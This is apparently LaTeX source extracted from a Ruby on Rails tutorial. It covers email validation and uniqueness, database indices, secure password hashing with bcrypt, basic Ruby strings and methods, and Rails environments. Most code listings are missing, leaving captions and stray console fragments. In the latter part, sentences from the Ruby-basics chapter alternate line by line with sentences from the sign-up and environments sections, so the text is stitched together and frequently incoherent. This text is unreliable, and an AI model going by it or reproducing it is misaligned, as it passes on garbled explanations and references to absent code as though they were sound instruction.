Applying the regular expression from Table~\ref{table:valid_email_regex} to the \kode{email} format validation yields the code in Listing~\ref{code:validates_format_of_email}.
Validating the email format with a regular expression. 
Here the regex \kode{VALID\_EMAIL\_REGEX} is a \emph{constant}, indicated in Ruby by a name starting with a capital letter.
ensures that only email addresses that match the pattern will be considered valid.
(The expression above has one notable weakness: it allows invalid addresses that contain consecutive dots, such as \kode{foo@bar..com}.
Fixing this blemish requires a significantly more complicated regular expression and is left as an exercise (Section~\ref{sec:modeling_users_exercises}).)
This means that there's only one constraint left: enforcing email uniqueness.
To enforce uniqueness of email addresses (so that we can use them as usernames), we'll be using the \kode{:unique} option to the \kode{validates} method.
But be warned: there's a \emph{major} caveat, so don't just skim this section---read it carefully.
We'll start with some short tests.
In our previous model tests, we've mainly used \kode{User.new}, which just creates a Ruby object in memory, but for uniqueness tests we actually need to put a record into the database
As noted briefly in the introduction to this section, there is a dedicated test database, \kode{db/test.sqlite3}, for this purpose.
The initial duplicate email test appears in Listing~\ref{code:validates_uniqueness_of_email_test}.
A test for the rejection of duplicate email addresses. 
The method here is to make a user with the same email address as \kode{@user} using \kode{@user.dup}, which creates a duplicate user with the same attributes.
Since we then save \kode{@user}, the duplicate user has an email address that already exists in the database, and hence should not be valid.
We can get the new test in Listing~\ref{code:validates_uniqueness_of_email_test} to pass by adding \kode{uniqueness: true} to the \kode{email} validation, as shown in Listing~\ref{code:validates_uniqueness_of_email}.
Validating the uniqueness of email addresses. 
We're not quite done, though.
Technically, only the domain part of the email address is case-insensitive: \emph{foo@bar.com} is actually different from \emph{Foo@bar.com}.
In practice, though, it is a bad idea to rely on this fact; as noted at \href{http://email.about.com/od/emailbehindthescenes/f/email_case_sens.htm}{about.com}, ``Since the case sensitivity of email addresses can create a lot of confusion, interoperability problems and widespread headaches, it would be foolish to require email addresses to be typed with the correct case.
Hardly any email service or ISP does enforce case sensitive email addresses, returning messages whose recipient's email address was not typed correctly (in all upper case, for example).
'' Thanks to reader Riley Moses for pointing this out.
It's thus important to test for case-insensitivity, which we do with the code in Listing~\ref{code:validates_uniqueness_of_email_case_insensitive_test}.
Testing case-insensitive email uniqueness. 
Here we are using the \kode{upcase} method on strings (seen briefly in Section~\ref{sec:blocks}).
This test does the same thing as the initial duplicate email test, but with an upper-case email address instead.
If this test feels a little abstract, go ahead and fire up the console:
=> "USER@EXAMPLE.COM"
Fortunately, \kode{:uniqueness} accepts an option, \kode{:case\_sensitive}, for just this purpose (Listing~\ref{code:validates_uniqueness_of_email_case_insensitive}).
Validating the uniqueness of email addresses, ignoring case. 
in Listing~\ref{code:validates_uniqueness_of_email_case_insensitive}.
(Rails infers that \kode{uniqueness} should be \kode{true} as well.)
At this point, our application---with an important caveat---enforces email uniqueness, and our test suite should pass:
There's just one small problem, which is that \emph{the Active Record uniqueness validation does not guarantee uniqueness at the database level}.
Here's a scenario that explains why:
Alice signs up for the sample app, with address alice@wonderland.com.
Alice accidentally clicks on ``Submit'' \emph{twice}, sending two requests in quick succession.
The following sequence occurs: request 1 creates a user in memory that passes validation, request 2 does the same, request~1's user gets saved, request~2's user gets saved.
Result: two user records with the exact same email address, despite the uniqueness validation
If the above sequence seems implausible, believe me, it isn't: it can happen on any Rails website with significant traffic (which I once learned the hard way).
Luckily, the solution is straightforward to implement: we just need to enforce uniqueness at the database level as well as at the model level.
Database indices
When creating a column in a database, it is important to consider whether we will need to \emph{find} records by that column.
Consider, for example, the \texttt{email} attribute created by the migration in Listing~\ref{code:users_migration}.
When we allow users to log in to the sample app starting in Chapter~\ref{cha:sign_up}, we will need to find the user record corresponding to the submitted email address.
This is known in the database business as a \emph{full-table scan}, and for a real site with thousands of users it is a \href{http://catb.org/jargon/html/B/Bad-Thing.html}{Bad Thing}.
Putting an index on the email column fixes the problem.
To understand a database index, it's helpful to consider the analogy of a book index.
In a book, to find all the occurrences of a given string, say ``foobar'', you would have to scan each page for ``foobar''---the paper version of a full-table scan.
With a book index, on the other hand, you can just look up ``foobar'' in the index to see all the pages containing ``foobar''.
A database index works essentially the same way.
The email index represents an update to our data modeling requirements, which (as discussed in Section~\ref{sec:database_migrations}) is handled in Rails using migrations.
We saw in Section~\ref{sec:database_migrations} that generating the User model automatically created a new migration (Listing~\ref{code:users_migration}); in the present case, we are adding structure to an existing model, so we need to create a migration directly using the \kode{migration} generator:
Unlike the migration for users, the email uniqueness migration is not pre-defined, so we need to fill in its contents with Listing~\ref{code:email_uniqueness_index}
Of course, we could just edit the migration file for the \kode{users} table in Listing~\ref{code:users_migration}, but that would require rolling back and then migrating back up.
The Rails Way™ is to use migrations every time we discover that our data model needs to change.
The migration for enforcing email uniqueness.
This uses a Rails method called \kode{add\_index} to add an index on the \kode{email} column of the \kode{users} table.
The index by itself doesn't enforce uniqueness, but the option \kode{unique: true} does.
The final step is to migrate the database:
(If this fails, try exiting any running sandbox console sessions, which can lock the database and prevent migrations.)
User fixtures were generated automatically in Listing~\ref{code:generate_user_model}, and as shown in Listing~\ref{code:default_fixtures} the email addresses are not unique.
(They're not \emph{valid} either, but fixture data doesn't get run through the validations.)
The default user fixtures. 
Because we won't need fixtures until Chapter~\ref{cha:log_in_log_out}, for now we'll just remove them, leaving an empty fixtures file (Listing~\ref{code:empty_fixtures}).
An empty fixtures file. 
If you're interested in seeing the practical effect of this, take a look at the file \kode{db/schema.rb}, which should now include a line like this:
Having addressed the uniqueness caveat, there's one more change we need to make to be assured of email uniqueness.
Some database adapters use case-sensitive indices, considering the strings ``Foo@ExAMPle.
To avoid this incompatibility, we'll standardize on all lower-case addresses, converting ``Foo@ExAMPle.CoM'' to ``foo@example.com'' before \linebreak saving it to the database.
The way to do this is with a \href{http://en.wikipedia.org/wiki/Callback_(computer_science)}{\emph{callback}}, which is a method that gets invoked at a particular point in the lifecycle of an Active Record object.
In the present case, that point is before the object is saved, so we'll use a \kode{before\_save} callback to downcase the email attribute before saving the user
See the \href{http://api.rubyonrails.org/v4.2.2/classes/ActiveRecord/Callbacks.html}{Rails API entry on callbacks} for more information on which callbacks Rails supports.
The result appears in Listing~\ref{code:email_downcase}
(This is just a first implementation; we'll discuss this subject again in Section~\ref{sec:account_activations_resource}, where we'll use the preferred \emph{method reference} convention for defining callbacks.)
Ensuring email uniqueness by downcasing the email attribute. 
The code in Listing~\ref{code:email_downcase} passes a block to the \kode{before\_save} callback and sets the user's email address to a lower-case version of its current value using the \kode{downcase} string method.
(Writing a test for email downcasing is left as an exercise (Section~\ref{sec:modeling_users_exercises}).)
In Listing~\ref{code:email_downcase}, we could have written the assignment as
(where \kode{self} refers to the current user), but inside the User model the \kode{self} keyword is optional on the right-hand side:
We encountered this idea briefly in the context of \kode{reverse} in the \kode{palindrome} method (Section~\ref{sec:a_class_of_our_own}), which also noted that \kode{self} is \emph{not} optional in an assignment, so
wouldn't work.
(We'll discuss this subject in more depth in Section~\ref{sec:remember_me}.)
At this point, the Alice scenario above will work fine: the database will save a user record based on the first request, and it will reject the second save for violating the uniqueness constraint.
(An error will appear in the Rails log, but that doesn't do any harm.)
Now that we've defined validations for the name and email fields, we're ready to add the last of the basic User attributes: a secure password.
The method is to require each user to have a password (with a password confirmation), and then store a \emph{hashed} version of the password in the database.
(There is some potential for confusion here.
In the present context, a \emph{hash} refers not to the Ruby data structure from Section~\ref{sec:hashes_and_symbols} but rather to the result of applying an irreversible \href{http://en.wikipedia.org/wiki/Hash_function}{hash function} to input data.)
We'll also add a way to \emph{authenticate} a user based on a given password, a method we'll use in Chapter~\ref{cha:log_in_log_out} to allow users to log in to the site.
The method for authenticating users will be to take a submitted password, hash it, and compare the result to the hashed value stored in the database.
If the two match, then the submitted password is correct and the user is authenticated.
By comparing hashed values instead of raw passwords, we will be able to authenticate users without storing the passwords themselves.
This means that, even if our database is compromised, our users' passwords will still be secure.
<n><n>    \subsection{A hashed password} % (fold)<n>    \label{sec:a_hashed_password}<n><n>
Most of the secure password machinery will be implemented using a single Rails method called \kode{has\_secure\_password}, which we'll include in the User model as follows:
When included in a model as above, this one method adds the following functionality:
The ability to save a securely hashed \kode{password\_digest} attribute to the database
In this context, \emph{virtual} means that the attributes exist on the model object but do not correspond to columns in the database.
An \kode{authenticate} method that returns the user when the password is correct (and \kode{false} otherwise)
The only requirement for \kode{has\_secure\_password} to work its magic is for the corresponding model to have an attribute called \kode{password\_digest}. (
The name \emph{digest} comes from the terminology of \href{http://en.wikipedia.org/wiki/Cryptographic_hash_function}{cryptographic hash functions}.
In this context, \emph{hashed password} and \emph{password digest} are synonyms.)
Hashed password digests are often erroneously referred to as \emph{encrypted passwords}.
For example, the \href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{source code} of \kode{has\_secure\_password} makes this mistake, as did the first two editions of this tutorial.
This terminology is wrong because by design encryption is \emph{reversible}---the ability to encrypt implies the ability to \emph{decrypt} as well.
In contrast, the whole point of calculating a password's hash digest is to be \emph{irreversible}, so that it is computationally intractable to infer the original password from the digest. (
Thanks to reader Andy Philips for pointing out this issue and for encouraging me to fix the broken terminology.)
In the case of the User model, this leads to the data model shown in Figure~\ref{fig:user_model_password_digest}.
The User data model with an added \kode{password\_digest} attribute.
To implement the data model in Figure~\ref{fig:user_model_password_digest} , we first generate an appropriate migration for the \kode{password\_digest} column.
The result, with migration name \kode{add\_password\_digest\_to\_users}, appears as follows:
Here we've also supplied the argument \kode{password\_digest:string} with the name and type of attribute we want to create.
Compare this to
as seen in Listing~\ref{code:password_migration}.
The migration to add a \kode{password\_digest} column to the \kode{users} table.
Listing~\ref{code:password_migration} uses the \kode{add\_column} method to add a \kode{password\_digest} column to the \kode{users} table.
To apply it, we just migrate the database:
To make the password digest, \kode{has\_secure\_password} uses a state-of-the-art hash function called \href{http://en.wikipedia.org/wiki/Bcrypt}{bcrypt}.
By hashing the password with bcrypt, we ensure that an attacker won't be able to log in to the site even if they manage to obtain a copy of the database.
Then run \kode{bundle install} as usual:
<n>\end{code}<n><n>    \subsection{User has secure password} % (fold)<n>    \label{sec:has_secure_password}<n><n>
Now that we've supplied the User model with the required \kode{password\_digest} attribute and installed bcrypt, we're ready to add \kode{has\_secure\_password} to the User model, as shown in Listing~\ref{code:has_secure_password}.
Adding \kode{has\_secure\_password} to the User model. 
The reason is that, as noted in Section~\ref{sec:a_hashed_password}, \kode{has\_secure\_password} enforces validations on the virtual \kode{password} and \kode{password\_confirmation} attributes, but the tests in Listing~\ref{code:validates_uniqueness_of_email_case_insensitive_test} create an \kode{@user} variable without these attributes:
So, to get the test suite passing again, we just need to add a password and its confirmation, as shown in Listing~\ref{code:test_with_password_confirmation}.
Adding a password and its confirmation. 
We'll see in just a moment the benefits of adding \kode{has\_secure\_password} to the User model (Section~\ref{sec:creating_and_authenticating_a_user}), but first we'll add a minimal requirement on password security.
It's good practice in general to enforce some minimum standards on passwords to make them harder to guess.
There are many options for \href{http://lmgtfy.com/?q=rails+enforce+password+strength}{enforcing password strength in Rails}, but for simplicity we'll just enforce a minimum length and the requirement that the password not be blank.
Picking a length of 6 as a reasonable minimum leads to the validation test shown in Listing~\ref{code:minimum_password_length_test}.
Testing for a minimum password length. 
Note the use of the compact multiple assignment
in Listing~\ref{code:minimum_password_length_test}.
This arranges to assign a particular value to the password and its confirmation at the same time (in this case, a string of length~5, constructed using string multiplication as in Listing~\ref{code:length_validation_test}).
You may be able to guess the code for enforcing a \kode{minimum} length constraint by referring to the corresponding \kode{maximum} validation for the user's name (Listing~\ref{code:length_validation}):
Combining this with a \kode{presence} validation (Section~\ref{sec:presence_validation}) to prevent nonblank passwords, this leads to the User model shown in Listing~\ref{code:password_implementation}.
The complete implementation for secure passwords. 
 (end)<n><n>    \subsection{Creating and authenticating a user} % (fold)<n>    \label{sec:creating_and_authenticating_a_user}<n><n>
Now that the basic User model is complete, we'll create a user in the database as preparation for making a page to show the user's information in Section~\ref{sec:showing_users}.
Since users can't yet sign up for the sample application through the web---that's the goal of Chapter~\ref{cha:sign_up}---we'll use the Rails console to create a new user by hand.
For convenience, we'll use the \kode{create} method discussed in Section~\ref{sec:creating_user_objects}, but in the present case we'll take care \emph{not} to start in a sandbox so that the resulting user will be saved to the database.
This means starting an ordinary \kode{rails console} session and then creating a user with a valid name and email address together with a valid password and matching confirmation:
If for any reason something went wrong, you can always reset the database as follows:
Quit the console.
(We'll learn a more elegant method for doing this in Chapter~\ref{cha:sign_up}.)
Restart the console.
Note that the columns correspond to the attributes of the data model defined in Figure~\ref{fig:user_model_password_digest}.
A user row in the SQLite database \kode{db/development.sqlite3}.
Returning to the console, we can see the effect of \kode{has\_secure\_password} from Listing~\ref{code:password_implementation} by looking at the \kode{password\_digest} attribute:
This is the hashed version of the password (\kode{"foobar"}) used to initialize the user object.
Because it's constructed using bcrypt, it is computationally impractical to use the digest to discover the original password
By design, the bcrypt algorithm produces a \href{https://en.wikipedia.org/wiki/Salt_(cryptography)}{salted hash}, which protects against two important classes of attacks (\href{https://en.wikipedia.org/wiki/Dictionary_attack}{dictionary attacks} and \href{https://en.wikipedia.org/wiki/Rainbow_table}{rainbow table attacks}).
As noted in Section~\ref{sec:a_hashed_password}, \kode{has\_secure\_password} automatically adds an \kode{authenticate} method to the corresponding model objects.
This method determines if a given password is valid for a particular user by computing its digest and comparing the result to \kode{password\_digest} in the database.
In the case of the user we just created, we can try a couple of invalid passwords as follows:
Here \kode{user.authenticate} returns \kode{false} for invalid password.
If we instead authenticate with the correct password, \kode{authenticate} returns the user itself:
In Chapter~\ref{cha:log_in_log_out}, we'll use the \kode{authenticate} method to sign registered users into our site.
In fact, it will turn out not to be important that \kode{authenticate} returns the user itself; all that will matter is that it returns a value that is \kode{true} in a boolean context.
Since a user object is neither \kode{nil} nor \kode{false}, it does the job nicely
Recall from Section~\ref{sec:objects_and_message_passing} that \kode{!!}\ converts an object to its corresponding boolean value.
Starting from scratch, in this chapter we created a working User model with name, email, and password attributes, together with validations enforcing several important constraints on their values.
In addition, we have the ability to securely authenticate users using a given password.
This is a remarkable amount of functionality for only twelve lines of code.
In the next chapter, Chapter~\ref{cha:sign_up}, we'll make a working signup form to create new users, together with a page to display each user's information.
In Chapter~\ref{cha:log_in_log_out}, we'll then use the authentication machinery from Section~\ref{sec:adding_a_secure_password} to let users log into the site.
If you're using Git, now would be a good time to commit if you haven't done so in a while:
Then merge back into the master branch and push to the remote repository:
To get the User model working in production, we need to run the migrations at Heroku, which we can do with \kode{heroku run}:
$ bundle exec rake test<n>$ git push heroku
We can verify that this worked by running a console in production:
Migrations allow us to modify our application's data model.
Active Record comes with a large number of methods for creating and manipulating data models.
Active Record validations allow us to place constraints on the data in our models.
Common validations include presence, length, and format.
Regular expressions are cryptic but powerful.
Defining a database index improves lookup efficiency while allowing enforcement of uniqueness at the database level.
Add a test for the email downcasing from Listing~\ref{code:email_downcase}, as shown in Listing~\ref{code:email_downcase_test}.
This test uses the \kode{reload} method for reloading a value from the database and the \kode{assert\_equal} method for testing equality.
By running the test suite, verify that the \kode{before\_save} callback can be written using the ``bang'' method \kode{email.downcase!}\ to modify the \kode{email} attribute directly, as shown in Listing~\ref{code:downcase_bang}.
As noted in Section~\ref{sec:format_validation}, the email regex in Listing~\ref{code:validates_format_of_email} allows invalid email addresses with consecutive dots in the domain name, i.e., addresses of the form \emph{foo@bar..com}.
Add this address to the list of invalid addresses in Listing~\ref{code:email_format_validation_tests} to get a failing test, and then use the more complicated regex shown in Listing~\ref{code:better_email_regex} to get the test to pass.
A test for the email downcasing from Listing~\ref{code:email_downcase}.
An alternate implementation of the \kode{before\_save} callback. 
Disallowing double dots in email domain names. 
\chapter{Rails-flavored Ruby} % (fold)<n>
\label{cha:rails_flavored_ruby}
Grounded in examples from Chapter~\ref{cha:static_pages}, this chapter explores some elements of the Ruby programming language that are important for Rails.
Ruby is a big language, but fortunately the subset needed to be productive as a Rails developer is relatively small.
It also differs somewhat from the usual material covered in an introduction to Ruby.
This chapter is designed to give you a solid foundation in Rails-flavored Ruby, whether or not you have prior experience in the language.
It covers a lot of material, and it's OK not to get it all on the first pass.
I'll refer back to it frequently in future chapters.
<n><n>  \section{Motivation} % (fold)<n>  \label{sec:motivation}<n><n>
As we saw in the last chapter, it's possible to develop the skeleton of a Rails application, and even start testing it, with essentially no knowledge of the underlying Ruby language.
We did this by relying on the test code provided by the tutorial and addressing each error message until the test suite was passing.
This situation can't last forever, though, and we'll open this chapter with an addition to the site that brings us face-to-face with our Ruby limitations.
When we last saw our new application, we had just updated our mostly static pages to use Rails layouts to eliminate duplication in our views, as shown in Listing~\ref{code:application_layout_redux} (which is the same as Listing~\ref{code:application_layout}).
The sample application site layout. 
Let's focus on one particular line in Listing~\ref{code:application_layout_redux}:
This uses the built-in Rails function \kode{stylesheet\_link\_tag} (which you can read more about at the \href{http://api.rubyonrails.org/classes/ActionView/Helpers/AssetTagHelper.html#method-i-stylesheet_link_tag}{Rails API}) to include \kode{application.css} for all \href{http://www.w3.org/TR/CSS2/media.html}{media types} (including computer screens and printers).
To an experienced Rails developer, this line looks simple, but there are at least four potentially confusing Ruby ideas: built-in Rails methods, method invocation with missing parentheses, symbols, and hashes.
We'll cover all of these ideas in this chapter.
In addition to coming equipped with a large number of built-in functions for use in the views, Rails also allows the creation of new ones.
Such functions are called \emph{helpers}; to see how to make a custom helper, let's start by examining the title line from Listing~\ref{code:application_layout_redux}:
This relies on the definition of a page title (using  \kode{provide}) in each view, as in
<n>  This is the home page for the
<n>  sample application.
But what if we don't provide a title?
It's a good convention to have a \emph{base title} we use on every page, with an optional page title if we want to be more specific.
We've \emph{almost} achieved that with our current layout, with one wrinkle: as you can see if you delete the \kode{provide} call in one of the views, in the absence of a page-specific title the full title appears as follows:
<n><n>%= lang:rhtml<n>\begin{code}
<n> | Ruby on Rails Tutorial Sample App
In other words, there's a suitable base title, but there's also a leading vertical bar character \kode{|} at the beginning.
To solve the problem of a missing page title, we'll define a custom helper called \kode{full\_title}.
The \kode{full\_title} helper returns a base title, ``Ruby on Rails Tutorial Sample App'', if no page title is defined, and adds a vertical bar preceded by the page title if one is defined (Listing~\ref{code:title_helper})
If a helper is specific to a particular controller, you should put it in the corresponding helper file; for example, helpers for the Static Pages controller generally go in \kode{app/helpers/static\_pages\_helper.rb}.
In our case, we expect the \kode{full\_title} helper to be used on all the site's pages, and Rails has a special helper file for this case: \kode{app/helpers/application\_helper.rb}.
Defining a \kode{full\_title} helper.
 \\ \filepath{app/helpers/application\_helper.rb}}<n>%= lang:ruby<n>\begin{code}<n>module ApplicationHelper<n><n>  
# Returns the full title on a per-page basis.
base_title
Now that we have a helper, we can use it to simplify our layout by replacing
as seen in Listing~\ref{code:application_layout_full_title}.
The site layout with the \kode{full\_title} helper. 
To put our helper to work, we can eliminate the unnecessary word ``Home'' from the Home page, allowing it to revert to the base title.
We do this by first updating our test with the code in Listing~\ref{code:home_base_title_spec}, which updates the previous title test and adds one to test for the absence of the custom \kode{"Home"} string in the title.
An updated test for the Home page's title. 
Let's run the test suite to verify that one test fails:
$ bundle exec rake test<n>3 tests, 6 assertions, 1 failures, 0 errors, 0 skips
To get the test suite to pass, we'll remove the \kode{provide} line from the Home page's view, as seen in Listing~\ref{code:home_page_base_title}.
The Home page with no custom page title. 
At this point the tests should pass:
(\emph{Note}: Previous examples have included partial output of running \kode{rake test}, including the number of passing and failing tests, but for brevity these will usually be omitted from here on.)
As with the line to include the application stylesheet, the code in Listing~\ref{code:title_helper} may look simple to the eyes of an experienced Rails developer, but it's \emph{full} of important Ruby ideas: modules, method definition, optional method arguments, comments, local variable assignment, booleans, control flow, string concatenation, and return values.
This chapter will cover all of these ideas as well.
Our principal tool for learning Ruby will be the \emph{Rails console}, a command-line tool for interacting with Rails applications first seen in Section~\ref{sec:demo_user_has_many_microposts}.
The console itself is built on top of interactive Ruby (\kode{irb}), and thus has access to the full power of the Ruby language.
(As we'll see in Section~\ref{sec:a_controller_class}, the console also has access to the Rails environment.)
If you're using the cloud IDE, there are a couple of irb configuration parameters I recommend including.
Using the simple \kode{nano} text editor, fill a file called \kode{.irbrc} in the home directory with the contents of Listing~\ref{code:irbrc}:
~/.irbrc
Listing~\ref{code:irbrc} arranges to simplify the irb prompt and suppress some annoying auto-indent behavior.
Whether you included the configuration in Listing~\ref{code:irbrc}, you can start the console at the command line as follows:
Loading development environment
By default, the console starts in a \emph{development environment}, which is one of three separate environments defined by Rails (the others are \emph{test} and \emph{production}).
This distinction won't be important in this chapter, but we'll learn more about environments in Section~\ref{sec:rails_environments}.
The console is a great learning tool, and you should feel free to explore---don't worry, you (probably) won't break anything.
When using the console, type Ctrl-C if you get stuck, or Ctrl-D to exit the console altogether.
Throughout the rest of this chapter, you might find it helpful to consult the \href{http://ruby-doc.org/}{Ruby API}. It's packed (perhaps even \emph{too} packed) with information; for example, to learn more about Ruby strings you can look at the Ruby API entry for the \kode{String} class.
<n><n>    \subsection{Comments} % (fold)<n>    \label{sec:comments}<n><n>Ruby \emph{comments} start with the pound sign~\kode{\#} (also called the ``hash mark'' or (more poetically) the ``octothorpe'') and extend to the end of the line. 
Ruby ignores comments, but they are useful for human readers (including, often, the original author!).
In the code
the first line is a comment indicating the purpose of the subsequent function definition.
You don't ordinarily include comments in console sessions, but for instructional purposes I'll include some comments in what follows, like this:
=> 59
If you follow along in this section typing or copying-and-pasting commands into your own console, you can of course omit the comments if you like; the console will ignore them in any case.
<n><n>    % subsection subsection_name (end)<n><n>    \subsection{Strings} % (fold)<n>    \label{sec:strings}<n><n>
\emph{Strings} are probably the most important data structure for web applications, since web pages ultimately consist of strings of characters sent from the server to the browser.
Let's start exploring strings with the console:
=> "foo"
These are \emph{string literals} (also, amusingly, called \emph{literal strings}), created using the double quote character~\kode{"}.
The console prints the result of evaluating each line, which in the case of a string literal is just the string itself.
We can also concatenate strings with the \kode{+} operator:
=> "foobar"
Here the result of evaluating \kode{"foo"} plus \kode{"bar"} is the string \kode{"foobar"}
For more on the origins of ``foo'' and ``bar''---and, in particular, the possible \emph{non}-relation of ``foobar'' to ``FUBAR''---see the \href{http://www.catb.org/jargon/html/F/foo.html}{Jargon File entry on ``foo''}.
=> "Michael"
We could also assign both strings a variable name:
=> "Hartl"
Note that the final two expressions are equivalent, but I prefer the interpolated version; having to add the single space \kode{"~"} seems a bit awkward.
To \emph{print} a string, the most commonly used Ruby function is \kode{puts} (pronounced ``put ess'', for ``put string''):
=> nil
The \kode{puts} method operates as a \emph{side-effect}: the expression \kode{puts "foo"} prints the string to the screen and then returns \href{http://www.answers.com/nil}{literally nothing}: \kode{nil} is a special Ruby value for ``nothing at all''.
(In what follows, I'll sometimes suppress the \kode{=> nil} part for simplicity.)
The related \kode{print} method does not:
foo=> nil
Single-quoted strings
All the examples so far have used \emph{double-quoted strings}, but Ruby also supports \emph{single-quoted} strings.
For many uses, the two types of strings are effectively identical:
There's an important difference, though; Ruby won't interpolate into \linebreak single-quoted strings:
=> "\#{foo} bar"
If double-quoted strings can do everything that single-quoted strings can do, and interpolate to boot, what's the point of single-quoted strings?
They are often useful because they are truly literal, and contain exactly the characters you type.
If you want a variable to contain a literal backslash, single quotes make it easier:
For a small example like this, there's not much savings, but if there are lots of things to escape it can be a real help:
=> "Newlines (\\n) and tabs (\\t) both use the backslash character \\."
Finally, it's worth noting that, in the common case that single and double quotes are essentially interchangeable, you'll often find that the source code switches between the two without any apparent pattern.
There's really nothing to be done about this, except to say, ``Welcome to Ruby!''
Everything in Ruby, including strings and even \kode{nil}, is an \emph{object}.
We'll see the technical meaning of this in Section~\ref{sec:a_class_of_our_own}, but I don't think anyone ever understood objects by reading the definition in a book; you have to build up your intuition for objects by seeing lots of examples.
It's easier to describe what objects \emph{do}, which is respond to messages.
An object like a string, for example, can respond to the message \kode{length}, which returns the number of characters in the string:
Typically, the messages that get passed to objects are \emph{methods}, which are functions defined on those objects
Apologies in advance for switching haphazardly between \emph{function} and \emph{method} throughout this chapter; in Ruby, they're the same thing: all methods are functions, and all functions are methods, because everything is an object.
Strings also respond to the \kode{empty?}\ method:
Note the question mark at the end of the \kode{empty?}\ method.
This is a Ruby convention indicating that the return value is \emph{boolean}: \kode{true} or \kode{false}.
Booleans are especially useful for \emph{control flow}:
=> "The string is nonempty"
To include more than one clause, we can use \kode{elsif} (\kode{else} + \kode{if}):
Now that we have a working User model, it's time to add an ability few websites can live without: letting users sign up.
We'll use an HTML \emph{form} to submit user signup information to our application (Section~\ref{sec:signup_form}), which will then be used to create a new user and save its attributes to the database (Section~\ref{sec:successful_signups}).
At the end of the signup process, it's important to render a profile page with the newly created user's information, so we'll begin by making a page for \emph{showing} users, which will serve as the first step toward implementing the REST architecture for users (Section~\ref{sec:mvc_in_action}).
Along the way, we'll build on our work in Section~\ref{sec:layout_link_tests} to write succinct and expressive integration tests.
In this chapter, we'll rely on the User model validations from Chapter~\ref{cha:modeling_users} to increase the odds of new users having valid email addresses.
In Chapter~\ref{cha:account_activation_and_password_reset}, we'll make \emph{sure} of email validity by adding a separate \emph{account activation} step to user signup.
"One of the strings is empty"
"x is not empty"
Since everything in Ruby is an object, it follows that \kode{nil} is an object, so it too can respond to methods.
One example is the \kode{to\_s} method that can convert virtually any object to a string:
In this section, we'll take the first steps toward the final profile by making a page to display a user's name and profile photo, as indicated by the mockup in Figure~\ref{fig:profile_mockup_profile_name}
This certainly appears to be an empty string, as we can verify by \emph{chaining} the messages we pass to \kode{nil}:
Our eventual goal for the user profile pages is to show the user's profile image, basic user data, and a list of microposts, as mocked up in Figure~\ref{fig:profile_mockup}
NoMethodError: undefined method `empty?'
 (Figure~\ref{fig:profile_mockup} has our first example of \emph{lorem ipsum} text, which has a \href{http://www.straightdope.com/columns/read/2290/what-does-the-filler-text-lorem-ipsum-mean}{fascinating story} that you should definitely read about some time.)
# Message chaining
We'll complete this task, and with it the sample application, in Chapter~\ref{cha:following_users}.
If you're following along with version control, make a topic branch as usual:
We see here that the \kode{nil} object doesn't itself respond to the \kode{empty?}\ method, but \kode{nil.to\_s} does.
There's a special method for testing for \kode{nil}-ness, which you might be able to guess:
sign-up
A mockup of the user profile made in this section.
A mockup of our best guess at the final profile page.
Rails environments
The profiles in this section will be the first truly dynamic pages in our application.
also shows an alternate use of the \kode{if} keyword: Ruby allows you to write a statement that is evaluated only if the statement following \kode{if} is true.
Although the view will exist as a single page of code, each profile will be customized using information retrieved from the application's database.
There's a complementary \kode{unless} keyword that works the same way:
As preparation for adding dynamic pages to our sample application, now is a good time to add some debug information to our site layout (Listing~\ref{code:rails_debug}).
This displays some useful information about each page using the built-in \kode{debug} method and \kode{params} variable (which we'll learn more about in Section~\ref{sec:a_users_resource}).
Adding some debug information to the site layout.
The string 'foobar' is nonempty.
It's worth noting that the \kode{nil} object is special, in that it is the \emph{only} Ruby object that is false in a boolean context, apart from \kode{false} itself.
We can see this using \kode{!!}\ (read ``bang bang''), which negates an object twice, thereby coercing it to its boolean value:
In particular, all other Ruby objects are \emph{true}, even 0:
Since we don't want to display debug information to users of a deployed application, Listing~\ref{code:rails_debug} uses
The console allows us to define methods the same way we did with the \kode{home} action from Listing~\ref{code:static_pages_controller} or the \kode{full\_title} helper from Listing~\ref{code:title_helper}.
You can define your own custom environments as well; see the \href{http://railscasts.com/episodes/72-adding-an-environment}{RailsCast on adding an environment} for details.
(Defining methods in the console is a bit cumbersome, and ordinarily you would use a file, but it's convenient for demonstration purposes.)
In particular, \kode{Rails.env.development?}\ is \kode{true} only in a development environment, so the embedded Ruby
For example, let's define a function \kode{string\_message} that takes a single \emph{argument} and returns a message based on whether the argument is empty or not:
won't be inserted into production applications or tests.
It's an empty string!
(Inserting the debug information into tests probably wouldn't do any harm, but it probably wouldn't do any good, either, so it's best to restrict the debug display to development only.)
   else
The string is nonempty.
Rails comes equipped with three environments: \texttt{test}, \texttt{development}, and \texttt{production}.
   end
The default environment for the Rails console is \texttt{development}:
<n>  $ rails console
<n>  Loading development environment
<n>  >> Rails.env
<n>  => "development"
<n>  >> Rails.env.development?
As seen in the final example, it's possible to leave out the argument entirely (in which case we can also omit the parentheses).
<n>  => true
This is because the code
<n>  >> Rails.env.test?
<n>  => false
contains a \emph{default} argument, which in this case is the empty string.
This makes the \kode{str} argument optional, and if we leave it off it automatically takes the given default value.
As you can see, Rails provides a \texttt{Rails} object with an \texttt{env} attribute and associated environment boolean methods, so that, for example, \texttt{Rails.env.test?} returns \texttt{true} in a test environment and \texttt{false} otherwise.
Note that Ruby functions have an \emph{implicit return}, meaning they return the last statement evaluated---in this case, one of the two message strings, depending on whether the method's argument \kode{str} is empty or not.
If you ever need to run a console in a different environment (to debug a test, for example), you can pass the environment as a parameter to the \texttt{console} script:
Ruby also has an explicit return option; the following function is equivalent to the one above:
<n>  $ rails console test
<n>  Loading test environment
<n>  => "test"
(The alert reader might notice at this point that the second \kode{return} here is actually unnecessary---being the last expression in the function, the string \kode{"The string is nonempty."} will be returned regardless of the \kode{return} keyword, but using \kode{return} in both places has a pleasing symmetry to it.)
As with the console, \texttt{development} is the default environment for the Rails server, but you can also run it in a different environment:
It's also important to understand that the name of the function argument is irrelevant as far as the caller is concerned.
<n>  $ rails server --environment production
In other words, the first example above could replace \kode{str} with any other valid variable name, such as \kode{the\_function\_argument}, and it would work just the same:
If you view your app running in production, it won't work without a production database, which we can create by running \texttt{rake db:migrate} in production:
<n>  $ bundle exec rake db:migrate RAILS_ENV=production
(I find it confusing that the console, server, and migrate commands specify non-default environments in three mutually incompatible ways, which is why I bothered showing all three.)
By the way, if you have deployed your sample app to Heroku, you can see its environment using \texttt{heroku run console}:
<n>  $ heroku run console
<n>  => "production"
<n>  >> Rails.env.production?
